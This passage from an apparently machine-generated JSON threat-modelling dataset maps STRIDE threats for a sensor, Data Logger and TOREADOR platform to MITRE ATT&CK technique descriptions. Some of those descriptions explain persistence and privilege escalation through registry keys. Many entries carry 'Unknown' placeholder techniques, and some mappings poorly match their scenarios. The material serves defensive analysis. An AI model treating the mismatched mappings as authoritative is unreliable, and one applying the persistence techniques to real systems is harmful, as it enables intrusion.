                    "Condition": "Valid if privilege escalation activities are not monitored."
                }
            ],
            "Potential Impact": "Unauthorized control over system functions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "system vulnerability",
                "admin access",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Image File Execution Options Injection",
                "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
                "technique_id": "T1546.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider gains privileged access to modify operational data on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls for privileged operations on the Dashboard.",
                    "Role": "System",
                    "Condition": "Valid if privileged operations are not tightly controlled."
                },
                {
                    "Assumption": "Internal monitoring of user privileges is insufficient.",
                    "Role": "System",
                    "Condition": "Valid if system lacks effective user activity monitoring."
                },
                {
                    "Assumption": "Insider has knowledge and means to elevate their privileges.",
                    "Role": "Insider",
                    "Condition": "Valid if insider has requisite skills and opportunity."
                }
            ],
            "Potential Impact": "Unauthorized modification of critical operational data.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "elevated privileges",
                "dashboard access",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker authenticates using phished credentials and escalates privileges in the system.",
            "Assumptions": [
                {
                    "Assumption": "Users\u2019 credentials can be easily phished or socially engineered.",
                    "Role": "Attacker",
                    "Condition": "Valid if users are susceptible to phishing."
                },
                {
                    "Assumption": "Weak access control policies and privilege escalation paths exist.",
                    "Role": "System",
                    "Condition": "Valid if controls and reviews are inadequate."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for sensitive operations.",
                    "Role": "System",
                    "Condition": "Valid if strong authentication mechanisms are not in place."
                }
            ],
            "Potential Impact": "Unauthorized access to high-privilege functions.",
            "MITRE ATT&CK Keywords": [
                "phished credentials",
                "privilege escalation",
                "weak access controls",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "A threat actor masquerades as the Data Logger, sending fake data to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to intercept and alter data.",
                    "Role": "Attacker",
                    "Condition": "Valid if network traffic is not securely encrypted."
                },
                {
                    "Assumption": "The system does not strictly verify the origin of incoming data.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if there is weak or no authentication method."
                },
                {
                    "Assumption": "No anomaly detection mechanisms are in place.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if the system lacks anomaly detection systems."
                }
            ],
            "Potential Impact": "Data integrity and reliability of predictions compromised.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data injection",
                "network communication",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs sensor identity to send manipulated data to Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to sensors.",
                    "Role": "Attacker",
                    "Condition": "Valid if security of sensors is compromised."
                },
                {
                    "Assumption": "There is no sensor-level authentication.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if sensors do not authenticate data before sending."
                },
                {
                    "Assumption": "No encryption between sensors and Data Logger.",
                    "Role": "Encryption Protocols",
                    "Condition": "Valid if data transmission is unencrypted."
                }
            ],
            "Potential Impact": "Integrity of collected sensor data lost, leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "sensor spoofing",
                "network manipulation",
                "false data injection",
                "integrity breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversary gains access to the TOREADOR platform by spoofing user identity.",
            "Assumptions": [
                {
                    "Assumption": "There are weak access control mechanisms in place.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if user authentication is inadequate."
                },
                {
                    "Assumption": "The attacker possesses some user credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials are stolen or guessed."
                },
                {
                    "Assumption": "No multi-factor authentication deployed.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if only single-factor authentication is used."
                }
            ],
            "Potential Impact": "Unauthorized system access, risking sensitive data exposure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "platform infiltration",
                "identity tampering"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data in the Data Logger before it is sent to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the Data Logger's local storage.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical or authorized access to Data Logger is available."
                },
                {
                    "Assumption": "Data is not encrypted at rest or in transit.",
                    "Role": "Encryption Protocols",
                    "Condition": "Valid if there is no encryption."
                },
                {
                    "Assumption": "No integrity checks on data at multiple stages.",
                    "Role": "System Integrity Mechanism",
                    "Condition": "Valid if data integrity verification is missing."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to incorrect analysis and predictions.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "local storage manipulation",
                "integrity compromise",
                "unauthorized modification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary alters the AI/ML model parameters or datasets, impacting predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Valid if platform security is weak."
                },
                {
                    "Assumption": "No logs or monitoring for changes in model parameters.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if there is inadequate activity monitoring."
                },
                {
                    "Assumption": "No data integrity checks for datasets used in training.",
                    "Role": "Data Integrity Mechanism",
                    "Condition": "Valid if model training data lacks integrity verification."
                }
            ],
            "Potential Impact": "Model integrity and reliability compromised, leading to faulty predictions.",
            "MITRE ATT&CK Keywords": [
                "model tampering",
                "parameter manipulation",
                "dataset poisoning",
                "integrity attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Manipulation of metadata associated with sensor data, disrupting predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access metadata storage systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if metadata is unprotected."
                },
                {
                    "Assumption": "Metadata changes are not tracked or logged.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if change tracking is absent."
                },
                {
                    "Assumption": "No validation checks for metadata accuracy.",
                    "Role": "System Integrity Mechanism",
                    "Condition": "Valid if metadata validation is not enforced."
                }
            ],
            "Potential Impact": "Incorrect contextualization of sensor data, resulting in faulty predictions.",
            "MITRE ATT&CK Keywords": [
                "metadata tampering",
                "context manipulation",
                "data integrity disruption",
                "unauthorized modification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies making updates to the AI/ML model parameters after data integrity issues are found.",
            "Assumptions": [
                {
                    "Assumption": "No auditing of user actions performed on the TOREADOR platform.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if logs are not maintained."
                },
                {
                    "Assumption": "Access controls to parameter updates are not exclusive.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if multiple users share access credentials."
                },
                {
                    "Assumption": "No multi-factor authentication for critical updates.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if single-factor authentication is used for updates."
                }
            ],
            "Potential Impact": "Inability to trace the origin of malicious updates, undermining system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "audit bypass",
                "integrity issues"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having accessed or viewed sensitive data from the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Lack of comprehensive user access logs.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if user actions are not logged."
                },
                {
                    "Assumption": "No strict access control policies for sensitive data.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "No alert mechanism for unusual access patterns.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if user behavior is not monitored."
                }
            ],
            "Potential Impact": "Challenges in identifying and addressing data leaks, potentially compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "access denial",
                "log evasion",
                "data confidentiality compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee claims they did not execute maintenance commands disrupted system operations.",
            "Assumptions": [
                {
                    "Assumption": "No robust tracking of command executions.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if executed commands are not logged."
                },
                {
                    "Assumption": "Shared administrative credentials among employees.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if multiple users share logins."
                },
                {
                    "Assumption": "No multifactor authentication for administrative activities.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if single-factor authentication is used."
                }
            ],
            "Potential Impact": "Difficulty in identifying the responsible party, affecting system stability and integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command execution denial",
                "audit failure",
                "system integrity issue"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted sensor data during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between sensors and Data Logger is not encrypted.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if no encryption protocol is used."
                },
                {
                    "Assumption": "No secure network channels are established.",
                    "Role": "Network Security Mechanism",
                    "Condition": "Valid if secure channels such as VPNs are not used."
                },
                {
                    "Assumption": "Attackers have network access.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers can access the network infrastructure."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational and predictive data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "network eavesdropping",
                "data confidentiality breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive historical data stored in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls to historical data storage.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if access control measures are insufficient."
                },
                {
                    "Assumption": "Inadequate logging and monitoring of data access events.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if access events are not logged."
                },
                {
                    "Assumption": "No encryption for data at rest.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if stored data is not encrypted."
                }
            ],
            "Potential Impact": "Exposure of sensitive historical data, risking confidentiality and compliance.",
            "MITRE ATT&CK Keywords": [
                "data access breach",
                "weak access control",
                "confidentiality compromise",
                "data at rest encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Metadata associated with sensor data exposed to unauthorized users.",
            "Assumptions": [
                {
                    "Assumption": "Weak or missing access control for metadata.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if metadata access is poorly restricted."
                },
                {
                    "Assumption": "Metadata is not anonymized.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if metadata anonymity is not enforced."
                },
                {
                    "Assumption": "Inadequate encryption for metadata storage and transmission.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if metadata is not encrypted."
                }
            ],
            "Potential Impact": "Sensitive operational details disclosed, risking security and privacy.",
            "MITRE ATT&CK Keywords": [
                "metadata exposure",
                "access control weakness",
                "sensitive information leak",
                "data confidentiality breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Receiver with excessive data, overwhelming it and causing a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting mechanisms are in place.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if there is no rate limiting."
                },
                {
                    "Assumption": "The attacker has network access to perform the attack.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access control is weak."
                },
                {
                    "Assumption": "No monitoring for unusual traffic patterns.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if traffic is not monitored."
                }
            ],
            "Potential Impact": "Disruption of data flow, impacting system availability and performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flood attack",
                "network overwhelm",
                "system availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious software introduced into the Data Logger to exhaust system resources and halt operations.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no malware detection and prevention mechanisms.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if malware defenses are inadequate."
                },
                {
                    "Assumption": "The attacker can gain local or remote access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "No resource monitoring on the Data Logger.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if resource utilization is not monitored."
                }
            ],
            "Potential Impact": "System resource exhaustion, leading to downtime and reduced system availability.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "malware injection",
                "system disruption",
                "availability compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Large-scale data manipulation causing the AI/ML system to produce erroneous outputs, rendering it unreliable.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to manipulate the training dataset.",
                    "Role": "Attacker",
                    "Condition": "Valid if dataset access controls are weak."
                },
                {
                    "Assumption": "No validation checks for incoming data.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if data validation is lacking."
                },
                {
                    "Assumption": "Model training processes are not securely monitored.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if process monitoring is inadequate."
                }
            ],
            "Potential Impact": "Unreliable predictions, risking operational disruption and inefficiency.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "AI/ML disruption",
                "system reliability issue",
                "availability impact"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The platform contains known or unknown vulnerabilities.",
                    "Role": "Platform Security Mechanism",
                    "Condition": "Valid if vulnerabilities are unpatched."
                },
                {
                    "Assumption": "Inadequate monitoring and alerting for privilege escalation activities.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if privilege escalation is not monitored."
                },
                {
                    "Assumption": "No strong authentication mechanisms for administrative actions.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if authentication is weak for admin tasks."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and control over critical system components.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "platform vulnerability",
                "administrative access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider uses their access to elevate privileges beyond their authorized level.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are insufficient to restrict privilege boundaries.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "No monitoring of user role and permission changes.",
                    "Role": "System Monitoring Mechanism",
                    "Condition": "Valid if privilege changes are not tracked."
                },
                {
                    "Assumption": "No multi-factor authentication for higher-level access.",
                    "Role": "System Security Mechanism",
                    "Condition": "Valid if only single-factor authentication is used."
                }
            ],
            "Potential Impact": "Unauthorized actions, risking data integrity, confidentiality, and availability.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege misuse",
                "unauthorized access",
                "integrity and confidentiality risk"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An adversary exploits a software bug in the Data Logger's firmware to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Firmware contains exploitable defects.",
                    "Role": "Firmware Security Mechanisms",
                    "Condition": "Valid if firmware is not updated or is vulnerable."
                },
                {
                    "Assumption": "No integrity checks for firmware updates.",
                    "Role": "System Integrity Mechanism",
                    "Condition": "Valid if firmware updates are unchecked."
                },
                {
                    "Assumption": "No monitoring for unusual root access activity.",
                    "Role": "System Monitoring Mechanism",
